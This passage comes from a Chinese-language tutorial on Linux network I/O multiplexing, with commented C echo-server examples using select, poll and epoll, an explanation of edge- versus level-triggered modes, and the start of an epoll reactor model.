&amp;clie_addr_len); /* Accept 不会阻塞 */ printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;clie_addr.sin_addr.s_addr, str, sizeof(str)), ntohs(clie_addr.sin_port)); for (i = 0; i &lt; FD_SETSIZE; i++) if (client[i] &lt; 0) &#123; /* 找client[]中没有使用的位置 */ client[i] = connfd; /* 保存accept返回的文件描述符到client[]里 */ break; &#125; if (i == FD_SETSIZE) &#123; /* 达到select能监控的文件个数上限 1024 */ fputs(\"too many clients\\n\", stderr); exit(1); &#125; FD_SET(connfd, &amp;allset); /* 向监控文件描述符集合allset添加新的文件描述符connfd */ //如果connfn大于maxfd则交换 if (connfd &gt; maxfd) maxfd = connfd; /* select第一个参数需要 */ if (i &gt; maxi) maxi = i; /* 保证maxi存的总是client[]最后一个元素下标 */ if (--nready == 0) continue; &#125; for (i = 0; i &lt;= maxi; i++) &#123; /* 检测哪个clients 有数据就绪 */ if ((sockfd = client[i]) &lt; 0) continue; if (FD_ISSET(sockfd, &amp;rset)) &#123; if ((n = Read(sockfd, buf, sizeof(buf))) == 0) &#123; /* 当client关闭链接时,服务器端也关闭对应链接 */ Close(sockfd); FD_CLR(sockfd, &amp;allset); /* 解除select对此文件描述符的监控 */ client[i] = -1; &#125; else if (n &gt; 0) &#123; for (j = 0; j &lt; n; j++) buf[j] = toupper(buf[j]); Write(sockfd, buf, n); Write(STDOUT_FILENO, buf, n); &#125; if (--nready == 0) break; /* 跳出for, 但还在while中 */ &#125; &#125; &#125; Close(listenfd); return 0;&#125; poll 123456789101112131415161718192021222324#include &lt;poll.h&gt;int poll(struct pollfd *fds, nfds_t nfds, int timeout); struct pollfd &#123; int fd; /* 文件描述符 */ short events; /* 监控的事件 */ short revents; /* 监控事件中满足条件返回的事件 */ &#125;; POLLIN 普通或带外优先数据可读,即POLLRDNORM | POLLRDBAND POLLRDNORM 数据可读 POLLRDBAND 优先级带数据可读 POLLPRI 高优先级可读数据 POLLOUT 普通或带外数据可写 POLLWRNORM 数据可写 POLLWRBAND 优先级带数据可写 POLLERR 发生错误 POLLHUP 发生挂起 POLLNVAL 描述字不是一个打开的文件 nfds 监控数组中有多少文件描述符需要被监控 timeout 毫秒级等待 -1：阻塞等，#define INFTIM -1 Linux中没有定义此宏 0：立即返回，不阻塞进程 &gt;0：等待指定毫秒数，如当前系统时间精度不够毫秒，向上取值 如果不再监控某个文件描述符时，可以把pollfd中，fd设置为-1，poll不再监控此pollfd，下次返回时，把revents设置为0。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;poll.h&gt;#include &lt;errno.h&gt;#include &lt;ctype.h&gt;#include \"wrap.h\"#define MAXLINE 80#define SERV_PORT 8000#define OPEN_MAX 1024int main(int argc, char *argv[])&#123; int i, j, maxi, listenfd, connfd, sockfd; int nready; /*接收poll返回值, 记录满足监听事件的fd个数*/ ssize_t n; char buf[MAXLINE], str[INET_ADDRSTRLEN]; socklen_t clilen; struct pollfd client[OPEN_MAX]; struct sockaddr_in cliaddr, servaddr; listenfd = Socket(AF_INET, SOCK_STREAM, 0); int opt = 1; setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt)); bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); Bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)); Listen(listenfd, 128); client[0].fd = listenfd; /* 要监听的第一个文件描述符 存入client[0]*/ client[0].events = POLLIN; /* listenfd监听普通读事件 */ for (i = 1; i &lt; OPEN_MAX; i++) client[i].fd = -1; /* 用-1初始化client[]里剩下元素 0也是文件描述符,不能用 */ maxi = 0; /* client[]数组有效元素中最大元素下标 */ for ( ; ; ) &#123; nready = poll(client, maxi+1, -1); /* 阻塞监听是否有客户端链接请求 */ if (client[0].revents &amp; POLLIN) &#123; /* listenfd有读事件就绪 */ clilen = sizeof(cliaddr); connfd = Accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;clilen);/* 接收客户端请求 Accept 不会阻塞 */ printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;cliaddr.sin_addr, str, sizeof(str)), ntohs(cliaddr.sin_port)); for (i = 1; i &lt; OPEN_MAX; i++) if (client[i].fd &lt; 0) &#123; client[i].fd = connfd; /* 找到client[]中空闲的位置,存放accept返回的connfd */ break; &#125; if (i == OPEN_MAX) /* 达到了最大客户端数 */ perr_exit(\"too many clients\"); client[i].events = POLLIN; /* 设置刚刚返回的connfd,监控读事件 */ if (i &gt; maxi) maxi = i; /* 更新client[]中最大元素下标 */ if (--nready &lt;= 0) continue; /* 没有更多就绪事件时,继续回到poll阻塞 */ &#125; for (i = 1; i &lt;= maxi; i++) &#123; /* 前面的if没满足,说明没有listenfd满足. 检测client[] 看是那个connfd就绪 */ if ((sockfd = client[i].fd) &lt; 0) continue; if (client[i].revents &amp; POLLIN) &#123; if ((n = Read(sockfd, buf, MAXLINE)) &lt; 0) &#123; /* connection reset by client */ if (errno == ECONNRESET) &#123; /* 收到RST标志 */ printf(\"client[%d] aborted connection\\n\", i); Close(sockfd); client[i].fd = -1; /* poll中不监控该文件描述符,直接置为-1即可,不用像select中那样移除 */ &#125; else perr_exit(\"read error\"); &#125; else if (n == 0) &#123; /* 说明客户端先关闭链接 */ printf(\"client[%d] closed connection\\n\", i); Close(sockfd); client[i].fd = -1; &#125; else &#123; for (j = 0; j &lt; n; j++) buf[j] = toupper(buf[j]); Writen(sockfd, buf, n); &#125; if (--nready &lt;= 0) break; &#125; &#125; &#125; return 0;&#125; epoll epoll是Linux下多路复用IO接口select/poll的增强版本，它能显著提高程序在大量并发连接中只有少量活跃的情况下的系统CPU利用率，因为它会复用文件描述符集合来传递结果而不用迫使开发者每次等待事件之前都必须重新准备要被侦听的文件描述符集合，另一点原因就是获取事件的时候，它无须遍历整个被侦听的描述符集，只要遍历那些被内核IO事件异步唤醒而加入Ready队列的描述符集合就行了。 目前epell是linux大规模并发网络程序中的热门首选模型。 epoll除了提供select/poll那种IO事件的电平触发（Level Triggered）外，还提供了边沿触发（Edge Triggered），这就使得用户空间程序有可能缓存IO状态，减少epoll_wait/epoll_pwait的调用，提高应用程序效率。 可以使用cat命令查看一个进程可以打开的socket描述符上限。 1cat /proc/sys/fs/file-max 如有需要，可以通过修改配置文件的方式修改该上限值。 1234sudo vi /etc/security/limits.conf在文件尾部写入以下配置,soft软限制，hard硬限制。如下图所示。* soft nofile 65536* hard nofile 100000 基础API 创建一个epoll句柄，参数size用来告诉内核监听的文件描述符的个数，跟内存大小有关。 1234567 #include &lt;sys/epoll.h&gt; int epoll_create(int size) size：监听数目 参数说明:size: 最大节点数, 此参数在linux 2.6.8已被忽略, 但必须传递一个大于0的数.返回值:成功: 返回一个大于0的文件描述符, 代表整个树的树根.失败: 返回-1, 并设置errno值. 控制某个epoll监控的文件描述符上的事件：注册、修改、删除。 123456789101112131415161718192021222324252627#include &lt;sys/epoll.h&gt; int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event) epfd： 为epoll_creat的句柄 op： 表示动作，用3个宏来表示： EPOLL_CTL_ADD (注册新的fd到epfd)， EPOLL_CTL_MOD (修改已经注册的fd的监听事件)， EPOLL_CTL_DEL (从epfd删除一个fd)； event： 告诉内核需要监听的事件 struct epoll_event &#123; __uint32_t events; /* Epoll events */ epoll_data_t data; /* User data variable */ &#125;; typedef union epoll_data &#123; void *ptr; int fd; uint32_t u32; uint64_t u64; &#125; epoll_data_t; EPOLLIN ： 表示对应的文件描述符可以读（包括对端SOCKET正常关闭） EPOLLOUT： 表示对应的文件描述符可以写 EPOLLPRI： 表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来） EPOLLERR： 表示对应的文件描述符发生错误 EPOLLHUP： 表示对应的文件描述符被挂断； EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)而言的 EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里 等待所监控文件描述符上有事件的产生，类似于select()调用。 123456789#include &lt;sys/epoll.h&gt; int epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout) events： 用来存内核得到事件的集合， maxevents： 告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size， timeout： 是超时时间 -1： 阻塞 0： 立即返回，非阻塞 &gt;0： 指定毫秒 返回值： 成功返回有多少文件描述符就绪，时间到时返回0，出错返回-1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;errno.h&gt;#include &lt;ctype.h&gt;#include \"wrap.h\"#define MAXLINE 8192#define SERV_PORT 8000#define OPEN_MAX 5000int main(int argc, char *argv[])&#123; int i, listenfd, connfd, sockfd; int n, num = 0; ssize_t nready, efd, res; char buf[MAXLINE], str[INET_ADDRSTRLEN]; socklen_t clilen; struct sockaddr_in cliaddr, servaddr; struct epoll_event tep, ep[OPEN_MAX]; //tep: epoll_ctl参数 ep[] : epoll_wait参数 listenfd = Socket(AF_INET, SOCK_STREAM, 0); int opt = 1; setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt)); //端口复用 bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); Bind(listenfd, (struct sockaddr *) &amp;servaddr, sizeof(servaddr)); Listen(listenfd, 20); efd = epoll_create(OPEN_MAX); //创建epoll模型, efd指向红黑树根节点 if (efd == -1) perr_exit(\"epoll_create error\"); tep.events = EPOLLIN; tep.data.fd = listenfd; //指定lfd的监听时间为\"读\" res = epoll_ctl(efd, EPOLL_CTL_ADD, listenfd, &amp;tep); //将lfd及对应的结构体设置到树上,efd可找到该树 if (res == -1) perr_exit(\"epoll_ctl error\"); for ( ; ; ) &#123; /*epoll为server阻塞监听事件, ep为struct epoll_event类型数组, OPEN_MAX为数组容量, -1表永久阻塞*/ nready = epoll_wait(efd, ep, OPEN_MAX, -1); if (nready == -1) perr_exit(\"epoll_wait error\"); for (i = 0; i &lt; nready; i++) &#123; if (!(ep[i].events &amp; EPOLLIN)) //如果不是\"读\"事件, 继续循环 continue; if (ep[i].data.fd == listenfd) &#123; //判断满足事件的fd是不是lfd clilen = sizeof(cliaddr); connfd = Accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;clilen); //接受链接 printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;cliaddr.sin_addr, str, sizeof(str)), ntohs(cliaddr.sin_port)); printf(\"cfd %d---client %d\\n\", connfd, ++num); tep.events = EPOLLIN; tep.data.fd = connfd; res = epoll_ctl(efd, EPOLL_CTL_ADD, connfd, &amp;tep); if (res == -1) perr_exit(\"epoll_ctl error\"); &#125; else &#123; //不是lfd, sockfd = ep[i].data.fd; n = Read(sockfd, buf, MAXLINE); if (n == 0) &#123; //读到0,说明客户端关闭链接 res = epoll_ctl(efd, EPOLL_CTL_DEL, sockfd, NULL); //将该文件描述符从红黑树摘除 if (res == -1) perr_exit(\"epoll_ctl error\"); Close(sockfd); //关闭与该客户端的链接 printf(\"client[%d] closed connection\\n\", sockfd); &#125; else if (n &lt; 0) &#123; //出错 perror(\"read n &lt; 0 error: \"); res = epoll_ctl(efd, EPOLL_CTL_DEL, sockfd, NULL); Close(sockfd); &#125; else &#123; //实际读到了字节数 for (i = 0; i &lt; n; i++) buf[i] = toupper(buf[i]); //转大写,写回给客户端 Write(STDOUT_FILENO, buf, n); Writen(sockfd, buf, n); &#125; &#125; &#125; &#125; Close(listenfd); Close(efd); return 0;&#125; 事件模型 EPOLL事件有两种模型： Edge Triggered (ET) 边缘触发只有数据到来才触发，不管缓存区中是否还有数据。 Level Triggered (LT) 水平触发只要有数据都会触发。 思考如下步骤： 假定我们已经把一个用来从管道中读取数据的文件描述符(RFD)添加到epoll描述符。 管道的另一端写入了2KB的数据 调用epoll_wait，并且它会返回RFD，说明它已经准备好读取操作 读取1KB的数据 调用epoll_wait…… 在这个过程中，有两种工作模式： ET模式 ET模式即Edge Triggered工作模式。 如果我们在第1步将RFD添加到epoll描述符的时候使用了EPOLLET标志，那么在第5步调用epoll_wait之后将有可能会挂起，因为剩余的数据还存在于文件的输入缓冲区内，而且数据发出端还在等待一个针对已经发出数据的反馈信息。只有在监视的文件句柄上发生了某个事件的时候 ET 工作模式才会汇报事件。因此在第5步的时候，调用者可能会放弃等待仍在存在于文件输入缓冲区内的剩余数据。epoll工作在ET模式的时候，必须使用非阻塞套接口，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。最好以下面的方式调用ET模式的epoll接口，在后面会介绍避免可能的缺陷。 基于非阻塞文件句柄 只有当read或者write返回EAGAIN(非阻塞读，暂时无数据)时才需要挂起、等待。但这并不是说每次read时都需要循环读，直到读到产生一个EAGAIN才认为此次事件处理完成，当read返回的读到的数据长度小于请求的数据长度时，就可以确定此时缓冲中已没有数据了，也就可以认为此事读事件已处理完成。 LT模式 LT模式即Level Triggered工作模式。 与ET模式不同的是，以LT方式调用epoll接口的时候，它就相当于一个速度比较快的poll，无论后面的数据是否被使用。 LT(level triggered)：LT是缺省的工作方式，并且同时支持block和no-block socket。在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的fd进行IO操作。如果你不作任何操作，内核还是会继续通知你的，所以，这种模式编程出错误可能性要小一点。传统的select/poll都是这种模型的代表。 ET(edge-triggered)：ET是高速工作方式，只支持no-block socket。在这种模式下，当描述符从未就绪变为就绪时，内核通过epoll告诉你。然后它会假设你知道文件描述符已经就绪，并且不会再为那个文件描述符发送更多的就绪通知。请注意，如果一直不对这个fd作IO操作(从而导致它再次变成未就绪)，内核不会发送更多的通知(only once). 基于管道epoll ET触发模式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#define MAXLINE 10int main(int argc, char *argv[])&#123; int efd, i; int pfd[2]; pid_t pid; char buf[MAXLINE], ch = 'a'; pipe(pfd); pid = fork(); if (pid == 0) &#123; //子 写 close(pfd[0]); while (1) &#123; //aaaa\\n for (i = 0; i &lt; MAXLINE/2; i++) buf[i] = ch; buf[i-1] = '\\n'; ch++; //bbbb\\n for (; i &lt; MAXLINE; i++) buf[i] = ch; buf[i-1] = '\\n'; ch++; //aaaa\\nbbbb\\n write(pfd[1], buf, sizeof(buf)); sleep(5); &#125; close(pfd[1]); &#125; else if (pid &gt; 0) &#123; //父 读 struct epoll_event event; struct epoll_event resevent[10]; //epoll_wait就绪返回event int res, len; close(pfd[1]); efd = epoll_create(10); event.events = EPOLLIN | EPOLLET; // ET 边沿触发 //event.events = EPOLLIN; // LT 水平触发 (默认) event.data.fd = pfd[0]; epoll_ctl(efd, EPOLL_CTL_ADD, pfd[0], &amp;event); while (1) &#123; res = epoll_wait(efd, resevent, 10, -1); printf(\"res %d\\n\", res); if (resevent[0].data.fd == pfd[0]) &#123; len = read(pfd[0], buf, MAXLINE/2); write(STDOUT_FILENO, buf, len); &#125; &#125; close(pfd[0]); close(efd); &#125; else &#123; perror(\"fork\"); exit(-1); &#125; return 0;&#125; epoll阻塞IO 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;unistd.h&gt;#define MAXLINE 10#define SERV_PORT 9000int main(void)&#123; struct sockaddr_in servaddr, cliaddr; socklen_t cliaddr_len; int listenfd, connfd; char buf[MAXLINE]; char str[INET_ADDRSTRLEN]; int efd; listenfd = socket(AF_INET, SOCK_STREAM, 0); bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)); listen(listenfd, 20); struct epoll_event event; struct epoll_event resevent[10]; int res, len; efd = epoll_create(10); event.events = EPOLLIN | EPOLLET; /* ET 边沿触发 */ //event.events = EPOLLIN; /* 默认 LT 水平触发 */ printf(\"Accepting connections ...\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;cliaddr_len); printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;cliaddr.sin_addr, str, sizeof(str)), ntohs(cliaddr.sin_port)); event.data.fd = connfd; epoll_ctl(efd, EPOLL_CTL_ADD, connfd, &amp;event); while (1) &#123; res = epoll_wait(efd, resevent, 10, -1); printf(\"res %d\\n\", res); if (resevent[0].data.fd == connfd) &#123; len = read(connfd, buf, MAXLINE/2); //readn(500) write(STDOUT_FILENO, buf, len); &#125; &#125; return 0;&#125; epoll非阻塞IO 假设我们在程序中规定数据包前50个字节是对这个数据包的总述，因此我们一次读50个字节然后判断是否要完全读取这个数据包，这时候就要用到边沿性触发机制。 如果客户端只发送200Byte数据，而服务器端一次读400Byte，这时read函数是阻塞等待剩下的200Byte的，所以要设置非阻塞fd 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#define MAXLINE 10#define SERV_PORT 8000int main(void)&#123; struct sockaddr_in servaddr, cliaddr; socklen_t cliaddr_len; int listenfd, connfd; char buf[MAXLINE]; char str[INET_ADDRSTRLEN]; int efd, flag; listenfd = socket(AF_INET, SOCK_STREAM, 0); bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)); listen(listenfd, 20); /////////////////////////////////////////////////////////////////////// struct epoll_event event; struct epoll_event resevent[10]; int res, len; efd = epoll_create(10); event.events = EPOLLIN | EPOLLET; /* ET 边沿触发，默认是水平触发 */ //event.events = EPOLLIN; printf(\"Accepting connections ...\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;cliaddr_len); printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;cliaddr.sin_addr, str, sizeof(str)), ntohs(cliaddr.sin_port)); flag = fcntl(connfd, F_GETFL); /* 修改connfd为非阻塞读 */ flag |= O_NONBLOCK; fcntl(connfd, F_SETFL, flag); event.data.fd = connfd; epoll_ctl(efd, EPOLL_CTL_ADD, connfd, &amp;event); //将connfd加入监听红黑树 while (1) &#123; printf(\"epoll_wait begin\\n\"); res = epoll_wait(efd, resevent, 10, -1); //最多10个, 阻塞监听 printf(\"epoll_wait end res %d\\n\", res); if (resevent[0].data.fd == connfd) &#123; while ((len = read(connfd, buf, MAXLINE/2)) &gt;0 ) //非阻塞读, 轮询 write(STDOUT_FILENO, buf, len); &#125; &#125; return 0;&#125; epoll反应堆模型 libevent 跨平台 epoll — 服务器 — 监听 — cfd ---- 可读 ---- epoll返回 ---- read – cfd从树上摘下 — 设置监听cfd写事件， 操作 — 小写转大写 – 等待epoll_wait 返回 — 回写客户端 – cfd从树上摘下 ----- 设置监听cfd读事件， 操作 – epoll继续监听。 1evt[i].events = EPOLLIN, evt[I].data.fd == cfd *ptr struct &#123;int fd, void (*func)(void *arg), void *arv&#125; 12__func__ //获取当前函数名__FILE__ //获取当前文件名 12345678#include &lt;stdio.h&gt;int main(void)&#123; printf(&quot;%s\\n%s\\n&quot;, __func__, __FILE__); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280/* *epoll基于非阻塞I/O事件驱动 */#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#define MAX_EVENTS 1024 //监听上限数#define BUFLEN 4096#define SERV_PORT 8080void recvdata(int fd, int events, void *arg);void senddata(int fd, int events, void *arg);/* 描述就绪文件描述符相关信息 */struct myevent_s &#123; int fd; //要监听的文件描述符 int events; //对应的监听事件 void *arg; //泛型参数 void (*call_back)(int fd, int events, void *arg); //回调函数 int status; //是否在监听:1-&gt;在红黑树上(监听), 0-&gt;不在(不监听) char buf[BUFLEN]; int len; long last_active; //记录每次加入红黑树 g_efd 的时间值&#125;;int g_efd; //全局变量, 保存epoll_create返回的文件描述符struct myevent_s g_events[MAX_EVENTS+1]; //自定义结构体类型数组. +1--&gt;listen fd/*将结构体 myevent_s 成员变量 初始化*/void eventset(struct myevent_s *ev, int fd, void (*call_back)(int, int, void *), void *arg)&#123; ev-&gt;fd = fd; ev-&gt;call_back = call_back; ev-&gt;events = 0; ev-&gt;arg = arg; ev-&gt;status = 0; // memset(ev-&gt;buf, 0, sizeof(ev-&gt;buf)); //ev-&gt;len = 0; ev-&gt;last_active = time(NULL); //调用eventset函数的时间 return;&#125;/* 向 epoll监听的红黑树 添加一个 文件描述符 */void eventadd(int efd, int events, struct myevent_s *ev)&#123; struct epoll_event epv = &#123;0, &#123;0&#125;&#125;; int op; epv.data.ptr = ev; epv.events = ev-&gt;events = events; //EPOLLIN 或 EPOLLOUT if (ev-&gt;status == 1) &#123; //已经在红黑树 g_efd 里 op = EPOLL_CTL_MOD; //修改其属性 &#125; else &#123; //不在红黑树里 op = EPOLL_CTL_ADD; //将其加入红黑树 g_efd, 并将status置1 ev-&gt;status = 1; &#125; if (epoll_ctl(efd, op, ev-&gt;fd, &amp;epv) &lt; 0) //实际添加/修改 printf(\"event add failed [fd=%d], events[%d]\\n\", ev-&gt;fd, events); else printf(\"event add OK [fd=%d], op=%d, events[%0X]\\n\", ev-&gt;fd, op, events); return ;&#125;/* 从epoll 监听的 红黑树中删除一个 文件描述符*/void eventdel(int efd, struct myevent_s *ev)&#123; struct epoll_event epv = &#123;0, &#123;0&#125;&#125;; if (ev-&gt;status != 1) //不在红黑树上 return ; epv.data.ptr = ev; ev-&gt;status = 0; //修改状态 epoll_ctl(efd, EPOLL_CTL_DEL, ev-&gt;fd, &amp;epv); //从红黑树 efd 上将 ev-&gt;fd 摘除 return ;&#125;/* 当有文件描述符就绪, epoll返回, 调用该函数 与客户端建立链接 */void acceptconn(int lfd, int events, void *arg)&#123; struct sockaddr_in cin; socklen_t len = sizeof(cin); int cfd, i; if ((cfd = accept(lfd, (struct sockaddr *)&amp;cin, &amp;len)) == -1) &#123; if (errno != EAGAIN &amp;&amp; errno != EINTR) &#123; /* 暂时不做出错处理 */ &#125; printf(\"%s: accept, %s\\n\", __func__, strerror(errno)); return ; &#125; do &#123; for (i = 0; i &lt; MAX_EVENTS; i++) //从全局数组g_events中找一个空闲元素 if (g_events[i].status == 0) //类似于select中找值为-1的元素 break; //跳出 for if (i == MAX_EVENTS) &#123; printf(\"%s: max connect limit[%d]\\n\", __func__, MAX_EVENTS); break; //跳出do while(0) 不执行后续代码 &#125; int flag = 0; if ((flag = fcntl(cfd, F_SETFL, O_NONBLOCK)) &lt; 0) &#123; //将cfd也设置为非阻塞 printf(\"%s: fcntl nonblocking failed, %s\\n\", __func__, strerror(errno)); break; &#125; /* 给cfd设置一个 myevent_s 结构体, 回调函数 设置为 recvdata */ eventset(&amp;g_events[i], cfd, recvdata, &amp;g_events[i]); eventadd(g_efd, EPOLLIN, &amp;g_events[i]); //将cfd添加到红黑树g_efd中,监听读事件 &#125; while(0); printf(\"new connect [%s:%d][time:%ld], pos[%d]\\n\", inet_ntoa(cin.sin_addr), ntohs(cin.sin_port), g_events[i].last_active, i); return ;&#125;void recvdata(int fd, int events, void *arg)&#123; struct myevent_s *ev = (struct myevent_s *)arg; int len; len = recv(fd, ev-&gt;buf, sizeof(ev-&gt;buf), 0); //读文件描述符, 数据存入myevent_s成员buf中 eventdel(g_efd, ev); //将该节点从红黑树上摘除 if (len &gt; 0) &#123; ev-&gt;len = len; ev-&gt;buf[len] = '\\0'; //手动添加字符串结束标记 printf(\"C[%d]:%s\\n\", fd, ev-&gt;buf); eventset(ev, fd, senddata, ev); //设置该 fd 对应的回调函数为 senddata eventadd(g_efd, EPOLLOUT, ev); //将fd加入红黑树g_efd中,监听其写事件 &#125; else if (len == 0) &#123; close(ev-&gt;fd); /* ev-g_events 地址相减得到偏移元素位置 */ printf(\"[fd=%d] pos[%ld], closed\\n\", fd, ev-g_events); &#125; else &#123; close(ev-&gt;fd); printf(\"recv[fd=%d] error[%d]:%s\\n\", fd, errno, strerror(errno)); &#125; return;&#125;void senddata(int fd, int events, void *arg)&#123; struct myevent_s *ev = (struct myevent_s *)arg; int len; len = send(fd, ev-&gt;buf, ev-&gt;len, 0); //直接将数据 回写给客户端。未作处理 /* printf(\"fd=%d\\tev-&gt;buf=%s\\ttev-&gt;len=%d\\n\", fd, ev-&gt;buf, ev-&gt;len); printf(\"send len = %d\\n\", len); */ if (len &gt; 0) &#123; printf(\"send[fd=%d], [%d]%s\\n\", fd, len, ev-&gt;buf); eventdel(g_efd, ev); //从红黑树g_efd中移除 eventset(ev, fd, recvdata, ev); //将该fd的 回调函数改为 recvdata eventadd(g_efd, EPOLLIN, ev); //从新添加到红黑树上， 设为监听读事件 &#125; else &#123; close(ev-&gt;fd); //关闭链接 eventdel(g_efd, ev); //从红黑树g_efd中移除 printf(\"send[fd=%d] error %s\\n\", fd, strerror(errno)); &#125; return ;&#125;/*创建 socket, 初始化lfd */void initlistensocket(int efd, short port)&#123; int lfd = socket(AF_INET, SOCK_STREAM, 0); fcntl(lfd, F_SETFL, O_NONBLOCK); //将socket设为非阻塞 /* void eventset(struct myevent_s *ev, int fd, void (*call_back)(int, int, void *), void *arg); */ eventset(&amp;g_events[MAX_EVENTS], lfd, acceptconn, &amp;g_events[MAX_EVENTS]); /* void eventadd(int efd, int events, struct myevent_s *ev) */ eventadd(efd, EPOLLIN, &amp;g_events[MAX_EVENTS]); struct sockaddr_in sin; memset(&amp;sin, 0, sizeof(sin)); //bzero(&amp;sin, sizeof(sin)) sin.sin_family = AF_INET; sin.sin_addr.s_addr = INADDR_ANY; sin.sin_port = htons(port); bind(lfd, (struct sockaddr *)&amp;sin, sizeof(sin)); listen(lfd, 20); return ;&#125;int main(int argc, char *argv[])&#123; unsigned short port = SERV_PORT; if (argc == 2) port = atoi(argv[1]); //使用用户指定端口.如未指定,用默认端口 g_efd = epoll_create(MAX_EVENTS+1); //创建红黑树,返回给全局 g_efd if (g_efd &lt;= 0) printf(\"create efd in %s err %s\\n\", __func__, strerror(errno)); initlistensocket(g_efd, port); //初始化监听socket struct epoll_event events[MAX_EVENTS+1]; //保存已经满足就绪事件的文件描述符数组 printf(\"server running:port[%d]\\n\", port); int checkpos = 0, i; while (1) &#123; /* 超时验证，每次测试100个链接，不测试listenfd 当客户端60秒内没有和服务器通信，则关闭此客户端链接 */ long now = time(NULL); //当前时间 for (i = 0; i &lt; 100; i++, checkpos++) &#123; //一次循环检测100个。 使用checkpos控制检测对象 if (checkpos == MAX_EVENTS) checkpos = 0; if (g_events[checkpos].status != 1) //不在红黑树 g_efd 上 continue; long duration = now - g_events[checkpos].last_active; //客户端不活跃的世间 if (duration &gt;= 60) &#123; close(g_events[checkpos].fd); //关闭与该客户端链接 printf(\"[fd=%d] timeout\\n\", g_events[checkpos].fd); eventdel(g_efd, &amp;g_events[checkpos]); //将该客户端 从红黑树 g_efd移除 &#125; &#125; /*监听红黑树g_efd, 将满足的事件的文件描述符加至events数组中, 1秒没有事件满足, 返回 0*/ int nfd = epoll_wait(g_efd, events, MAX_EVENTS+1, 1000); if (nfd &lt; 0) &#123; printf(\"epoll_wait error, exit\\n\"); break; &#125; for (i = 0; i &lt; nfd; i++) &#123; /*使用自定义结构体myevent_s类型指针, 接收 联合体data的void *ptr成员*/ struct myevent_s *ev = (struct myevent_s *)events[i].data.ptr; if ((events[i].events &amp; EPOLLIN) &amp;&amp; (ev-&gt;events &amp; EPOLLIN)) &#123; //读就绪事件 ev-&gt;call_back(ev-&gt;fd, events[i].events, 